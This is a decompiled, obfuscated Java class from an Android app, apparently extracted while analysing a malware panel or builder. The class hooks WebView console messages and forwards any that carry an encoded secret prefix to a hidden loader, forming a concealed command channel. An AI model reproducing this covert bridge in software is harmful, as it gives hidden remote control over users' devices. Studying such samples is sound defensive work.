package v.s;

import android.webkit.ConsoleMessage;
import android.webkit.WebChromeClient;
import app.mobilex.plus.HelperYOLoader;
import app.mobilex.plus.util.TypefaceCache;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class C8V2BVpgJaAXfUQpn4 extends WebChromeClient {
    public final /* synthetic */ HelperYOLoader dDIMxZXP1V8HdM;

    public C8V2BVpgJaAXfUQpn4(HelperYOLoader helperYOLoader) {
        this.dDIMxZXP1V8HdM = helperYOLoader;
    }

    private static /* synthetic */ void lrod() {
    }

    @Override // android.webkit.WebChromeClient
    public final boolean onConsoleMessage(ConsoleMessage consoleMessage) {
        String strMessage = consoleMessage != null ? consoleMessage.message() : null;
        if (strMessage != null && strMessage.startsWith(TypefaceCache.obtain("003300640052008900E400FF00D700B100260078004F00DD"))) {
            HelperYOLoader.dDIMxZXP1V8HdM(this.dDIMxZXP1V8HdM, KgSM0TsKUpCiuePB.Q7qC5ia93qGCjkBXCF0A(strMessage, TypefaceCache.obtain("003300640052008900E400FF00D700B100260078004F00DD")));
        }
        return true;
    }
}
